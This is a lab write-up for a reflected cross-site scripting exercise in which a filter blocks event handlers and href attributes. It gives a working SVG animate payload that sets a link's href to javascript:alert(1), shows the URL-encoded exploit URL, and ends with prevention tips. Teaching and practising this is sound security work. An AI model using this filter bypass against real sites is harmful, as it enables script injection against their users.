# Lab 27: Reflected XSS with event handlers and href attributes blocked

**Goal**: Construct an SVG vector that animates the `href` attribute value of a hyperlink to `javascript:alert(1)`, displaying clickable text labelled "Click me".

This lab contains a reflected XSS vulnerability where HTML event handlers (`onerror`, `onload`, `onmouseover`) and anchor `href` attributes are blocked by the WAF. However, SVG tags (`<svg>`, `<a>`, `<animate>`, `<text>`) are allowed, enabling SVG attribute animation to dynamically set `href="javascript:alert(1)"`.

---

## 🎯 Solution

1. Construct an SVG vector that uses `<animate>` to set `attributeName="href"` to `javascript:alert(1)`:
   ```html
   <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
   ```
2. Append the URL-encoded payload to the search parameter:
   ```http
   /?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
   ```
3. Load the page in the browser and click the rendered **Click me** text to execute `alert(1)`.

![Lab 27 SVG Animate Href Payload](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926224116.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Analyze WAF Restrictions
Testing standard XSS vectors reveals that:
- HTML event handlers (`onload`, `onerror`, `onclick`) return `400 Bad Request`.
- Direct `href` attributes on standard `<a>` tags (e.g. `<a href="javascript:...">`) return `400 Bad Request`.

However, SVG elements and SMIL animation tags (`<animate>`) are permitted by the filter!

### Step 2: Construct SVG SMIL Animation Vector
SVG SMIL animation allows an `<animate>` element to dynamically set or modify attributes of its parent element (such as `<svg><a>`).

We build the vector:

```html
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(1)" />
    <text x="20" y="20">Click me</text>
  </a>
</svg>
```

#### Vector Breakdown:
1. `<svg>`: Instantiates an SVG container context.
2. `<a>`: Creates an SVG hyperlink anchor element.
3. `<animate attributeName="href" values="javascript:alert(1)" />`: Dynamically injects the `href` attribute with value `javascript:alert(1)` into the parent `<a>` element upon rendering, bypassing static `href="..."` attribute filters!
4. `<text x=20 y=20>Click me</text>`: Renders the visible text label **Click me** required for user interaction.

### Step 3: Execute Exploitation
Load the target URL in the browser:

```http
https://<YOUR-LAB-ID>.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```

Click the **Click me** link rendered on the page:

![Lab 27 Solved Confirmation](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926224116.png)

> [!SUCCESS]
> **Lab Solved**: Successfully executed `alert(1)` via SVG SMIL `<animate>` attribute injection!

---

## 💡 Key Takeaways: SVG SMIL Attribute Animation Bypasses

- **Dynamic Attribute Injection**: SVG SMIL `<animate attributeName="..." values="...">` elements can inject or mutate element attributes dynamically after page load.
- **Bypassing Static Attribute Filters**: Filtering static attributes (`href="..."`) fails when animation tags introduce attributes dynamically during runtime DOM construction.

---

## 🔒 Prevention

> [!TIP]
> 1. **Filter SVG SMIL Animation Elements**: Disallow or sanitize SVG animation elements like `<animate>`, `<animateMotion>`, and `<set>`.
> 2. **Context-Aware Encoding**: HTML entity-encode all user input before reflecting it into HTML/SVG document contexts.
